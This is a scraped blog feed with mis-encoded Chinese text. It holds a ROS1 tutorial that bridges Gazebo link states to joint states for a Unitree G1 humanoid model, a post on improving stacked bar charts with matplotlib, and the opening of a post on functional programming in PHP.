<p>åå®¢å°åï¼<a href="https://www.cnblogs.com/zylyehuo/" target="_blank">https://www.cnblogs.com/zylyehuo/</a></p>
</blockquote>
<blockquote>
<p><a href="https://github.com/unitreerobotics/unitree_ros/tree/master/robots/g1_description" target="_blank" rel="noopener nofollow">Unitree G1 æ¨¡åæä»¶ä¸è½½å°å(æéèªå·±éè¦çé¨åï¼æ¬æç¨åºäº g1_29dof.urdf (ä»¥å .xml å meshes æä»¶å¤¹))</a></p>
</blockquote>
<blockquote>
<p>ææ ¸å¿ç URDF æä»¶å Meshes (STL ç½æ ¼æä»¶)</p>
</blockquote>
<p><img src="https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260113204337327-270675226.png" alt="image" loading="lazy"></p>
<blockquote>
<p>ä¸º Gazebo ä¸­æ¨¡åæ·»å é¢è²åèï¼<a href="https://www.cnblogs.com/zylyehuo/p/19479129" target="_blank">ROS1 noetic ä¸­å° Unitree G1 ç URDF å¯¼å¥ Gazebo/RViz</a></p>
</blockquote>
<blockquote>
<p>å¹¶éåºäºä¼ ç»ç ros_controlï¼éè¿æä»¶æ§å¶å³èï¼ï¼èæ¯éè¿ Gazebo ç¶æåé¦ -&gt; è®¡ç®ä½å§¿ -&gt; æ å°å° TF å JointState çæ¹å¼å®ç°çã</p>
</blockquote>
<ul>
<li>è¯¥ç³»ç»è·³è¿äº ros_control æ§å¶å¨ã</li>
<li>å /joint_commands åé JointState æ¶æ¯æ¶ï¼èæ¬ä¼è°ç¨ Gazebo ç /gazebo/set_model_configuration æå¡ã</li>
<li>è¿ä¸ªæå¡ç´æ¥âå¼ºè¡âè®¾ç½® Gazebo ä¸­ç©çæ¨¡åçå³èä½ç½®ï¼ç±»ä¼¼äºç¬ç§»ï¼èä¸æ¯æ½å åç©ãå¨è°è¯è§åç®æ³æ¶éå¸¸é«æã</li>
</ul>
<h1 id="ææé¢è§">ææé¢è§</h1>
<p><img src="https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118152755660-1755629437.png" alt="image" loading="lazy"></p>
<h1 id="å·¥ä½ç©ºé´ç»æ">å·¥ä½ç©ºé´ç»æ</h1>
<p><img src="https://img2024.cnblogs.com/blog/3071480/202601/3071480-20260118161444336-1800514403.png" alt="image" loading="lazy"></p>
<h1 id="ä¸»è¦æä»¶">ä¸»è¦æä»¶</h1>
<h2 id="display_and_gazebolaunch">display_and_gazebo.launch</h2>
<pre><code>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;launch&gt;
  &lt;!-- å è½½æºå¨äººURDFæ¨¡ååæ° --&gt;
  &lt;param name="robot_description" textfile="$(find g1_description)/urdf/g1_29dof.urdf" /&gt;

  &lt;!-- TFéæåæ¢ --&gt;
  &lt;node pkg="tf" type="static_transform_publisher" name="world_to_map" args="0 0 0  0 0 0 1  world map 10"/&gt;
  &lt;!-- NOTE: removed static base_link-&gt;pelvis to avoid TF duplication; link_states_bridge publishes dynamic map-&gt;base_link --&gt;
  &lt;node pkg="tf" type="static_transform_publisher" name="imu_in_torso2body_imu" args="0.0  0.0  0.0   0.0 0.0 0.0 1  imu_in_torso body_imu 100" /&gt;
  &lt;!-- NOTE: keep base_link-&gt;pelvis as a static zero transform so pelvis and base_link coincide --&gt;
  &lt;node pkg="tf" type="static_transform_publisher" name="base_link2pelvis" args="0 0 0  0 0 0 1  base_link pelvis 100" /&gt;

  &lt;!-- æºå¨äººç¶æåå¸å¨ --&gt;
  &lt;node name="robot_state_publisher" pkg="robot_state_publisher" type="robot_state_publisher" /&gt;

  &lt;!-- LinkStateså°JointStateçæ¡¥æ¥ï¼åæ¶åå¸å¨æTFåå¤çå³èå½ä»¤ --&gt;
  &lt;node name="link_states_bridge" pkg="g1_description" type="link_states_bridge.py" output="screen" /&gt;

  &lt;!-- RViz --&gt;
  &lt;node name="rviz" pkg="rviz" type="rviz" respawn="false" output="screen" /&gt;

  &lt;!-- ============ Gazeboéç½® ============ --&gt;
  &lt;!-- å¯å¨Gazebo --&gt;
  &lt;include file="$(find gazebo_ros)/launch/empty_world.launch"&gt;
    &lt;arg name="paused" value="false"/&gt;
    &lt;arg name="use_sim_time" value="true"/&gt;
    &lt;arg name="gui" value="true"/&gt;
    &lt;arg name="headless" value="false"/&gt;
  &lt;/include&gt;

  &lt;!-- å°æºå¨äººæ¨¡åçæå°Gazeboä¸­ --&gt;
  &lt;node name="spawn_urdf" pkg="gazebo_ros" type="spawn_model" 
    args="-param robot_description -urdf -z 0.79 -model g1_robot" 
    output="screen" /&gt;

  &lt;!-- NOTE: controller parameters loading removed to avoid conflicts; using bridge(set_model_configuration) instead --&gt;

&lt;/launch&gt;

</code></pre>
<h2 id="link_states_bridgepy">link_states_bridge.py</h2>
<pre><code class="language-python">#!/usr/bin/env python3

import rospy
import math
from gazebo_msgs.msg import LinkStates
from sensor_msgs.msg import JointState
from std_msgs.msg import Float64
import numpy as np
from scipy.spatial.transform import Rotation
import threading
import tf
from geometry_msgs.msg import TransformStamped
from gazebo_msgs.srv import SetModelConfiguration

class LinkStatesToJointState:
    def __init__(self):
        rospy.init_node('link_states_to_joint_state')
        
        # è®¢éGazeboçé¾æ¥ç¶æ
        self.link_states_sub = rospy.Subscriber('/gazebo/link_states', LinkStates, self.link_states_callback, queue_size=1)
        
        # è®¢éå³èå½ä»¤è¯é¢ï¼ç¨äºæ§å¶Gazeboä¸­çå³èï¼
        self.joint_cmd_sub = rospy.Subscriber('/joint_commands', JointState, self.joint_cmd_callback, queue_size=1)
        
        # åå¸joint_states
        self.joint_states_pub = rospy.Publisher('/joint_states', JointState, queue_size=1)
        
        # åå¸TFåæ¢
        self.tf_broadcaster = tf.TransformBroadcaster()
        
        # ææå³èåå¶parent/childé¾æ¥æ å°
        self.joints_info = {
            'left_hip_pitch_joint': ('pelvis', 'left_hip_pitch_link', [0, 1, 0]),
            'left_hip_roll_joint': ('left_hip_pitch_link', 'left_hip_roll_link', [1, 0, 0]),
            'left_hip_yaw_joint': ('left_hip_roll_link', 'left_hip_yaw_link', [0, 0, 1]),
            'left_knee_joint': ('left_hip_yaw_link', 'left_knee_link', [0, 1, 0]),
            'left_ankle_pitch_joint': ('left_knee_link', 'left_ankle_pitch_link', [0, 1, 0]),
            'left_ankle_roll_joint': ('left_ankle_pitch_link', 'left_ankle_roll_link', [1, 0, 0]),
            'right_hip_pitch_joint': ('pelvis', 'right_hip_pitch_link', [0, 1, 0]),
            'right_hip_roll_joint': ('right_hip_pitch_link', 'right_hip_roll_link', [1, 0, 0]),
            'right_hip_yaw_joint': ('right_hip_roll_link', 'right_hip_yaw_link', [0, 0, 1]),
            'right_knee_joint': ('right_hip_yaw_link', 'right_knee_link', [0, 1, 0]),
            'right_ankle_pitch_joint': ('right_knee_link', 'right_ankle_pitch_link', [0, 1, 0]),
            'right_ankle_roll_joint': ('right_ankle_pitch_link', 'right_ankle_roll_link', [1, 0, 0]),
            'waist_yaw_joint': ('pelvis', 'waist_yaw_link', [0, 0, 1]),
            'waist_roll_joint': ('waist_yaw_link', 'waist_roll_link', [1, 0, 0]),
            'waist_pitch_joint': ('waist_roll_link', 'torso_link', [0, 1, 0]),
            'left_shoulder_pitch_joint': ('torso_link', 'left_shoulder_pitch_link', [0, 1, 0]),
            'left_shoulder_roll_joint': ('left_shoulder_pitch_link', 'left_shoulder_roll_link', [1, 0, 0]),
            'left_shoulder_yaw_joint': ('left_shoulder_roll_link', 'left_shoulder_yaw_link', [0, 0, 1]),
            'left_elbow_joint': ('left_shoulder_yaw_link', 'left_elbow_link', [0, 1, 0]),
            'left_wrist_roll_joint': ('left_elbow_link', 'left_wrist_roll_link', [1, 0, 0]),
            'left_wrist_pitch_joint': ('left_wrist_roll_link', 'left_wrist_pitch_link', [0, 1, 0]),
            'left_wrist_yaw_joint': ('left_wrist_pitch_link', 'left_wrist_yaw_link', [0, 0, 1]),
            'right_shoulder_pitch_joint': ('torso_link', 'right_shoulder_pitch_link', [0, 1, 0]),
            'right_shoulder_roll_joint': ('right_shoulder_pitch_link', 'right_shoulder_roll_link', [1, 0, 0]),
            'right_shoulder_yaw_joint': ('right_shoulder_roll_link', 'right_shoulder_yaw_link', [0, 0, 1]),
            'right_elbow_joint': ('right_shoulder_yaw_link', 'right_elbow_link', [0, 1, 0]),
            'right_wrist_roll_joint': ('right_elbow_link', 'right_wrist_roll_link', [1, 0, 0]),
            'right_wrist_pitch_joint': ('right_wrist_roll_link', 'right_wrist_pitch_link', [0, 1, 0]),
            'right_wrist_yaw_joint': ('right_wrist_pitch_link', 'right_wrist_yaw_link', [0, 0, 1]),
        }
        
        # Gazebo set_model_configuration æå¡ä»£çï¼ç¨äºç´æ¥è®¾ç½®å³èä½ç½®ï¼æ¿ä»£ros_controlï¼
        rospy.wait_for_service('/gazebo/set_model_configuration')
        self.set_model_config = rospy.ServiceProxy('/gazebo/set_model_configuration', SetModelConfiguration)
        
        self.last_msg = None
        self.lock = threading.Lock()
        self.initial_pelvis_z = None  # åå§pelvisé«åº¦

        # TF åå¸èæµåæ°
        self.last_tf_time = rospy.Time(0)
        self.tf_min_interval = rospy.Duration(0.05)  # æå°é´é 50ms
        self.last_pelvis_pose = None
        self.tf_pos_thresh = 0.005   # 5mm
        self.tf_rot_thresh = 0.01    # ~0.57deg
        
        rospy.loginfo("Link States to Joint State Bridge initialized")
        rospy.loginfo("Now using /gazebo/set_model_configuration to apply joint commands")
        rospy.loginfo("Publish JointState to /joint_commands to control joints")
    
    def link_states_callback(self, msg):
        with self.lock:
            self.last_msg = msg
            self.publish_joint_states(msg)
            self.publish_dynamic_tf(msg)
    
    def joint_cmd_callback(self, msg):
        """è®¢éå³èå½ä»¤è¯é¢ï¼ä½¿ç¨Gazeboæå¡è®¾ç½®å³èä½ç½®ï¼ä¸ä¾èµURDF transmissionï¼"""
        try:
            if not msg.name or not msg.position:
                rospy.logwarn("Received empty joint command")
                return
            # è°ç¨æå¡è®¾ç½®å³èä½ç½®
            model_name = 'g1_robot'
            urdf_param_name = 'robot_description'
            joint_names = list(msg.name)
            joint_positions = list(msg.position)
            rospy.loginfo(f"Setting joints via service: {joint_names} -&gt; {joint_positions}")
            self.set_model_config(model_name, urdf_param_name, joint_names, joint_positions)
        except Exception as e:
            rospy.logerr(f"Failed to call set_model_configuration: {e}")
    
    def get_link_index(self, link_name, msg):
        """è·åé¾æ¥å¨LinkStatesä¸­çç´¢å¼"""
        full_name = f'g1_robot::{link_name}'
        try:
            return msg.name.index(full_name)
        except ValueError:
            return -1
    
    def get_relative_rotation(self, parent_pose, child_pose):
        """è®¡ç®ä»parentå°childçç¸å¯¹æè½¬ï¼ååæ°ï¼"""
        p_quat = [parent_pose.orientation.x, parent_pose.orientation.y, 
                  parent_pose.orientation.z, parent_pose.orientation.w]
        c_quat = [child_pose.orientation.x, child_pose.orientation.y, 
                  child_pose.orientation.z, child_pose.orientation.w]
        
        p_rot = Rotation.from_quat(p_quat)
        c_rot = Rotation.from_quat(c_quat)
        
        rel_rot = p_rot.inv() * c_rot
        
        return rel_rot
    
    def rotation_to_angle_around_axis(self, rotation, axis):
        angle = rotation.magnitude()
        
        if abs(angle) &lt; 1e-6:
            return 0.0
        
        rotvec = rotation.as_rotvec()
        rot_axis = rotvec / angle if angle &gt; 1e-6 else [0, 0, 1]
        
        axis_norm = np.array(axis) / np.linalg.norm(axis)
        
        if np.dot(rot_axis, axis_norm) &gt; 0.9:
            return angle
        elif np.dot(rot_axis, axis_norm) &lt; -0.9:
            return -angle
        else:
            euler = rotation.as_euler('xyz')
            if axis == [1, 0, 0]:
                return euler[0]
            elif axis == [0, 1, 0]:
                return euler[1]
            elif axis == [0, 0, 1]:
                return euler[2]
            else:
                return 0.0
    
    def publish_joint_states(self, msg):
        joint_state = JointState()
        joint_state.header.stamp = rospy.Time.now()
        joint_state.name = list(self.joints_info.keys())
        joint_state.position = []
        joint_state.velocity = [0.0] * len(joint_state.name)
        joint_state.effort = [0.0] * len(joint_state.name)
        
        for joint_name, (parent_name, child_name, axis) in self.joints_info.items():
            parent_idx = self.get_link_index(parent_name, msg)
            child_idx = self.get_link_index(child_name, msg)
            
            if parent_idx &lt; 0 or child_idx &lt; 0:
                joint_state.position.append(0.0)
                continue
            
            rel_rot = self.get_relative_rotation(msg.pose[parent_idx], msg.pose[child_idx])
            angle = self.rotation_to_angle_around_axis(rel_rot, axis)
            
            joint_state.position.append(angle)
        
        self.joint_states_pub.publish(joint_state)
    
    def publish_dynamic_tf(self, msg):
        pelvis_idx = self.get_link_index('pelvis', msg)

        if pelvis_idx &lt; 0:
            return

        pelvis_pose = msg.pose[pelvis_idx]

        # èæµé»è¾
        now = rospy.Time.now()
        if self.last_pelvis_pose is not None:
            pos_diff = np.linalg.norm([
                pelvis_pose.position.x - self.last_pelvis_pose.position.x,
                pelvis_pose.position.y - self.last_pelvis_pose.position.y,
                pelvis_pose.position.z - self.last_pelvis_pose.position.z
            ])
            rot_diff = Rotation.from_quat([
                pelvis_pose.orientation.x, pelvis_pose.orientation.y,
                pelvis_pose.orientation.z, pelvis_pose.orientation.w
            ]).inv() * Rotation.from_quat([
                self.last_pelvis_pose.orientation.x, self.last_pelvis_pose.orientation.y,
                self.last_pelvis_pose.orientation.z, self.last_pelvis_pose.orientation.w
            ])
            rot_diff_angle = rot_diff.magnitude()

            if pos_diff &lt; self.tf_pos_thresh and rot_diff_angle &lt; self.tf_rot_thresh and (now - self.last_tf_time) &lt; self.tf_min_interval:
                return

        self.last_tf_time = now
        self.last_pelvis_pose = pelvis_pose

        translation = (pelvis_pose.position.x, pelvis_pose.position.y, pelvis_pose.position.z)
        rotation_q = (pelvis_pose.orientation.x, pelvis_pose.orientation.y, pelvis_pose.orientation.z, pelvis_pose.orientation.w)

        # åªåå¸ map -&gt; base_linkï¼è®© base_link-&gt;pelvis ç±éæåå¸å¨ï¼launchï¼å¤ç
        self.tf_broadcaster.sendTransform(
            translation=translation,
            rotation=rotation_q,
            time=rospy.Time.now(),
            child='base_link',
            parent='map'
        )

if __name__ == '__main__':
    try:
        node = LinkStatesToJointState()
        rospy.spin()
    except rospy.ROSInterruptException:
        pass

</code></pre>
<h1 id="è¿è¡æ­¥éª¤">è¿è¡æ­¥éª¤</h1>
<pre><code>cd ~/g1_test_ws
</code></pre>
<pre><code>catkin_make
</code></pre>
<pre><code>source ./devel/setup.bash
</code></pre>
<pre><code>roslaunch g1_description display_and_gazebo.launch
</code></pre>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0.059027777777777776" data-date-updated="2026-01-18 17:02">2026-01-18 15:37</span>&nbsp;
<a href="https://www.cnblogs.com/zylyehuo">zylyehuo</a>&nbsp;
éè¯»(<span id="post_view_count">29</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19498596);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19498596', targetLink: 'https://www.cnblogs.com/zylyehuo/p/19498596', title: 'ROS1 noetic ä¸­å° Unitree G1 åºäº Gazebo/RViz å³èèå¨ãåºäº Gazebo ç¶æåé¦ã' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ æç ´å ç§¯å°å±ï¼ä¼åå ç§¯æ¡å½¢å¾çå¯¹æ¯ææ ]]></title>
    <link>https://www.cnblogs.com/wang_yb/p/19498573</link>
    <guid>60ecff9d92d11a54945d82ba47ddda33</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/wang_yb/p/19498573" title="åå¸äº 2026-01-18 15:25">
    <span role="heading" aria-level="2">æç ´å ç§¯å°å±ï¼ä¼åå ç§¯æ¡å½¢å¾çå¯¹æ¯ææ</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>å¨æ°æ®å¯è§åä¸­ï¼<strong>å ç§¯æ¡å½¢å¾</strong> æé¿å±ç¤º <strong>âæ´ä½ä¸ææâ</strong> çå³ç³»ï¼ä½å½æ¯ä¸ªæ±å­åçåæ®µè¶è¿4ä¸ªæ¶ï¼è¯»èå¾é¾åæ¶è¿½è¸ªåæ®µçé¿åº¦ãä½ç½®ä¸é¢è²æ å°ï¼ <strong>è¯¯è¯»æ¦çæ¾èä¸å</strong>ã</p>
<p>æ´ç³çæ¯ï¼è¥ä¸åç±»å«çæ»éå·®å¼å¾å¤§ï¼å ç§¯ç»æä¼æ¾å¤§è§è§éè§ï¼å¯¼è´âçèµ·æ¥å·®ä¸å¤âçç»è®ºå¤±çã</p>
<p>ä»å¤©ï¼æ¬æå°å°è¯æ¢ç´¢ä¸ä¸æ¹è¿å ç§¯æ¡å½¢å¾çåç°æ¹å¼ï¼è®©å¤ææ°æ®å¯¹æ¯åå¾ä¸ç®äºç¶ã</p>
<p>å¦æå¤§å®¶ææ´å¥½çæ¹å¼ï¼ä¹æ¬¢è¿ææï¼äº¤æµã<strong>å®æ´çä»£ç </strong>ä¼å¨ææ«æä¾å±äº«çå°åã</p>
<h1 id="1-å ç§¯æ¡å½¢å¾çå°å¢">1. å ç§¯æ¡å½¢å¾çå°å¢</h1>
<p><strong>å ç§¯æ¡å½¢å¾</strong>å°±åä¸éç²¾å¿æççå¤å±èç³ï¼å½å±æ°ä¸å¤æ¶ï¼æä»¬è½è½»æ¾åè¾¨æ¯å±çé«åº¦å·®å¼ã</p>
<p>ä½å½èç³å±æ°è¶è¿4å±ï¼è¦æ¯è¾æä¸ç¹å®å£å³å¨å¤ä¸ªèç³ä¸­çå«éå°±åå¾å¼å¸¸å°é¾ã</p>
<p>ä¸é¢æä»¬ç¨<code>Python</code>æ¨¡æä¸ä¸ªå¸¸è§çå ç§¯æ¡å½¢å¾åºæ¯ï¼è°æ¥æäº§å5ä¸ªåè½æ¨¡åçç¨æ·æ»¡æåº¦ï¼5ä¸ªç»´åº¦ï¼ï¼å±æ¶éäº4ä¸ªå­£åº¦çæ°æ®ã</p>
<pre><code class="language-python"># æ¨¡ææ°æ®ï¼4ä¸ªå­£åº¦ï¼5ä¸ªæ»¡æåº¦ç»´åº¦ï¼å¼ºçåå¯¹ãåå¯¹ãä¸­ç«ãåæãåå³åæï¼
quarters = ["ç¬¬ä¸å­£åº¦", "ç¬¬äºå­£åº¦", "ç¬¬ä¸å­£åº¦", "ç¬¬åå­£åº¦"]
categories = ["å¼ºçåå¯¹", "åå¯¹", "ä¸­ç«", "åæ", "åå³åæ"]
colors = ["#FF6B6B", "#FF9F6B", "#D6CBCB", "#6BCF7F", "#4D96FF"]

# æ¯ä¸ªå­£åº¦çæ»¡æåº¦åå¸ï¼ç¾åæ¯ï¼
data = np.array(
    [
        [5, 10, 25, 40, 20],  # ç¬¬ä¸å­£åº¦
        [3, 8, 20, 45, 24],  # ç¬¬äºå­£åº¦
        [4, 12, 18, 43, 23],  # ç¬¬ä¸å­£åº¦
        [2, 6, 15, 50, 27],  # ç¬¬åå­£åº¦
    ]
)

# ä¼ ç»æ¨ªåå ç§¯æ¡å½¢å¾
fig, ax = plt.subplots(1, 2, figsize=(14, 4), gridspec_kw={"width_ratios": [1, 1]})

# å·¦å¾ï¼ä¼ ç»æ¨ªåå ç§¯æ¡å½¢å¾
# ... çç¥ ...

# å³å¾ï¼æ¨ªåå å æ¡å½¢å¾çæ¹è¿çï¼æ·»å åéçº¿
# ... çç¥ ...

plt.tight_layout()
plt.show()
</code></pre>

<p><img src="https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152231940-1462391798.png" alt="" loading="lazy"></p>
<p>è¿ä¸ªæ¨ªåå ç§¯æ¡å½¢å¾å±ç¤ºäºæ¯ä¸ªå­£åº¦ç¨æ·æ»¡æåº¦çå®æ´åå¸ï¼éä¾¿å³è¾¹çå¾ç¨å¾®åäºä¸äºæ¹è¿ï¼</p>
<p>ä½å¦ææä»¬æ³åç­ä»¥ä¸é®é¢å°±ä¼éå°å°é¾ï¼</p>
<ul>
<li><strong>"åå³åæ"</strong> çæ¯ä¾å¨åªä¸ªå­£åº¦æé«ï¼</li>
<li><strong>"åå¯¹"</strong> å <strong>"å¼ºçåå¯¹"</strong> çæ¯ä¾å¦ä½éæ¶é´ååï¼</li>
</ul>
<h1 id="2-æè§£éæ--å¤ä¸ªå­å¾">2. æè§£éæ--å¤ä¸ªå­å¾</h1>
<p>ä¸å¶æææé£æçå¨ä¸ééï¼ä¸å¦å°å®ä»¬åçææ¾ã</p>
<p>æä»¬å°<strong>å ç§¯æ¡å½¢å¾</strong>æè§£ä¸º5ä¸ªå°å¾ï¼æ¯ä¸ªå°å¾åªå³æ³¨ä¸ä¸ªæ»¡æåº¦ç»´åº¦çå­£åº¦ååã</p>
<pre><code class="language-python">import matplotlib.gridspec as gridspec

fig = plt.figure(figsize=(12, 6))
gs = gridspec.GridSpec(2, 5, figure=fig, hspace=0.3, wspace=0.4)
# æè§£å ç§¯æ¡å½¢å¾ï¼ä¸ºæ¯ä¸ªç±»å«åå»ºåç¬çæ¨ªåå­å¾
axes = []
for i in range(5):
    axes.append(fig.add_subplot(gs[0, i]))

# ä¸ºæ¯ä¸ªæ»¡æåº¦ç»´åº¦åå»ºä¸ä¸ªæ¨ªåæ¡å½¢å¾
for i, (category, color, ax) in enumerate(zip(categories, colors, axes)):
    # ... çç¥ ...

ax = fig.add_subplot(gs[1, :]) # ç¬¬1è¡ï¼ææå (ç­åäº gs[1, 0:5])
# ... çç¥ ...

plt.show()
</code></pre>

<p><img src="https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232008-1859050466.png" alt="" loading="lazy"></p>
<p>æè§£åçå¾è¡¨ç¡®å®æåäºåä¸ç»´åº¦çå¯¹æ¯ææï¼ä½ä»æä¸ä¸ªææ¾é®é¢ï¼æä»¬çè§çº¿éè¦å¨å¤ä¸ªå¾è¡¨é´æ¥åè·³è·ï¼æ æ³å½¢æç»ä¸çè§è§å°è±¡ã</p>
<p>è¿å°±åéè¯»ä¸æ¬åæ£å¨å¤ä¸ªé¡µé¢çè¡¨æ ¼ï¼éè¦ä¸æ­ç¿»é¡µå¯¹ç§ã</p>
<h1 id="3-ååå¯¹æ¯--è´è¶å¾">3. ååå¯¹æ¯--è´è¶å¾</h1>
<p><strong>è´è¶å¾</strong>ï¼ä¹ç§°ä¸ºäººå£éå­å¡å¾æååæ¡å½¢å¾ï¼æ¯æ°æ®å¯è§åç"çå£«åå"ï¼ç¹å«éåå±ç¤ºå¯¹ç«æååæ¯è¾çæ°æ®ã</p>
<p>å®çè®¾è®¡å²å­¦æ¯ï¼è®©å¯¹æ¯å¨ä¸­å¿è½´ä¸¤ä¾§èªç¶å±å¼ï¼å°±åè´è¶å±å¼åç¿ã</p>
<pre><code class="language-python"># 4. åå»ºç»å¸
fig, ax = plt.subplots(2, 1,figsize=(10, 6))
y_pos = np.arange(len(quarters))
# æåæ°æ®å
strongly_disagree = data[:, 0]
disagree          = data[:, 1]
neutral           = data[:, 2]
agree             = data[:, 3]
strongly_agree    = data[:, 4]

# ==========================================
# æ ¸å¿é»è¾ä¿®æ¹ï¼ä»¥ä¸­ç«(Neutral)çä¸­å¿ä¸º0ç¹
# ==========================================
# 1. ç»å¶ä¸­ç« (ç°è²)ï¼è·¨è¶ 0 è½´
# left ä» -width/2 å¼å§ï¼è¿æ · 0 å°±å¨æ­£ä¸­é´

# 2. ç»å¶å·¦ä¾§ (è´é¢æç»ª)ï¼åå·¦å å 
# åå¯¹ (Green)ï¼èµ·å§ä½ç½®å¨ -neutral/2 çå·¦è¾¹

# å¼ºçåå¯¹ (Purple)ï¼èµ·å§ä½ç½®å¨ åå¯¹ çå·¦è¾¹

# 3. ç»å¶å³ä¾§ (æ­£é¢æç»ª)ï¼åå³å å 
# åæ (Orange)ï¼èµ·å§ä½ç½®å¨ neutral/2

# å¼ºçåæ (Red)ï¼èµ·å§ä½ç½®å¨ åæ çå³è¾¹

# 5. ç¾åå¾è¡¨
# æ·»å ä¸­é´çåºåçº¿ (ç©¿è¿ä¸­ç«æ¡å½¢)
# ... çç¥ ...
plt.show()
</code></pre>

<p><img src="https://img2024.cnblogs.com/blog/83005/202601/83005-20260118152232037-237677572.png" alt="" loading="lazy"></p>
<p><strong>è´è¶å¾</strong>åä¸è¬çå ç§¯æ¡å½¢å¾æ¾å¨ä¸èµ·ï¼å¯ä»¥ææ¾çåºä¸¤èå¨æ°æ®å±ç¤ºé»è¾åè§è§éå¿ä¸ææ¾èåºå«ã</p>
<p><strong>è´è¶å¾</strong>ä¾§éäºå±ç¤º <strong>âå¯¹ç«æåº¦çå¯¹æ¯â</strong>ï¼éåçæ­£åä¸¤é¢çåéæ¬æ®ä»¥åæ´ä½çæç»ªå¾åï¼èä¸ä¹ä¾¿äºæ¯è¾åä¾§çæ°æ®ã</p>
<h1 id="4-æ»ç»">4. æ»ç»</h1>
<p>æ»ä¹ï¼<strong>å ç§¯æ¡å½¢å¾</strong>åä¸éå¤§æç©ï¼å½é£æï¼æ°æ®ç»´åº¦ï¼è¿å¤æ¶ï¼æä»¬å¾é¾åå°ï¼åæï¼å°æ¯ç§é£æçåå³ã</p>
<p>éè¿æè§£åéæï¼æä»¬è·å¾äºæ´æ¸æ°çè§è§ãèè´è¶å¾ååä¸ä½ä¼éçèèï¼å°å¯¹æ¯æ°æ®ä»¥å¯¹ç§°çæ¹å¼å±å¼ï¼æ¢ä¿çäºæ´ä½è§éï¼åå¼ºåäºå±é¨å¯¹æ¯ã</p>
<p>ä¼ç§çæ°æ®å¯è§åä¸å¨äºå±ç¤ºææä¿¡æ¯ï¼èå¨äºä»¥æå°çè®¤ç¥ææ¬ä¼ è¾¾æå¤çæ´å¯ã</p>
<p>ä¸æ¬¡å½æä»¬é¢å¯¹å¤ç»´æ°æ®å¯¹æ¯çæææ¶ï¼ä¸å¦¨è¯è¯æ¨ªåè´è¶å¾è¿æ"çå£«åå"ï¼å®å¯è½ä¼ç»ä½ å¸¦æ¥ææ³ä¸å°çæ¸æ°ä¸ç¾æã</p>
<p>ç»å¶æä¸­å¾åçå®æ´ä»£ç å±äº«å¨ï¼<a href="https://url11.ctfile.com/f/45455611-8606783265-a93d12?p=6872" target="_blank" rel="noopener nofollow">ä¼åå ç§¯æ¡å½¢å¾.ipynb</a> (è®¿é®å¯ç : 6872)</p>

</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-18 15:26">2026-01-18 15:25</span>&nbsp;
<a href="https://www.cnblogs.com/wang_yb">wang_yb</a>&nbsp;
éè¯»(<span id="post_view_count">34</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19498573);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19498573', targetLink: 'https://www.cnblogs.com/wang_yb/p/19498573', title: 'æç ´å ç§¯å°å±ï¼ä¼åå ç§¯æ¡å½¢å¾çå¯¹æ¯ææ' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ 2026 å¹´ PHP å½æ°å¼ç¼ç¨ ä¼å¿ä¸å®éåºç¨ ]]></title>
    <link>https://www.cnblogs.com/catchadmin/p/19497758</link>
    <guid>9c451b81438fe78ab496bd83edfd653d</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/catchadmin/p/19497758" title="åå¸äº 2026-01-18 08:26">
    <span role="heading" aria-level="2">2026 å¹´ PHP å½æ°å¼ç¼ç¨ ä¼å¿ä¸å®éåºç¨</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="2026-å¹´-php-å½æ°å¼ç¼ç¨-ä¼å¿ä¸å®éåºç¨">2026 å¹´ PHP å½æ°å¼ç¼ç¨ ä¼å¿ä¸å®éåºç¨</h1>
<p>å½æ°å¼ç¼ç¨ï¼FPï¼å·²ç»å­å¨å åå¹´äºï¼ä½è¿å¹´æ¥å¨å®éå¼åä¸­ç¨å¾è¶æ¥è¶å¤ãè¿ç¯æç« æ´çä¸ä¸ FP çæ ¸å¿æ¦å¿µåå®éåºç¨åºæ¯ã</p>
<h2 id="ä»ä¹æ¯å½æ°å¼ç¼ç¨">ä»ä¹æ¯å½æ°å¼ç¼ç¨</h2>
<p>å¨æ·±å¥ä¼å¿ååºç¨ä¹åï¼åå¿«éåé¡¾ä¸ä¸å½æ°å¼ç¼ç¨æ¯ä»ä¹ã</p>
<p>å½æ°å¼ç¼ç¨çæ ¸å¿æ¯æè®¡ç®å½ä½æ°å­¦å½æ°çæ±å¼ãå®æ¯ä¸ç§å£°æå¼ç¼ç¨é£æ ¼ï¼æè¿°çæ¯"è¦ä»ä¹"ï¼èä¸æ¯"æä¹å"ãå¨ FP ä¸­ï¼å½æ°æ¯ä¸ç­å¬æ°ï¼å¯ä»¥ä½ä¸ºåæ°ä¼ éç»å¶ä»å½æ°ï¼å¯ä»¥ä»å½æ°è¿åï¼ä¹å¯ä»¥èµå¼ç»åéã</p>
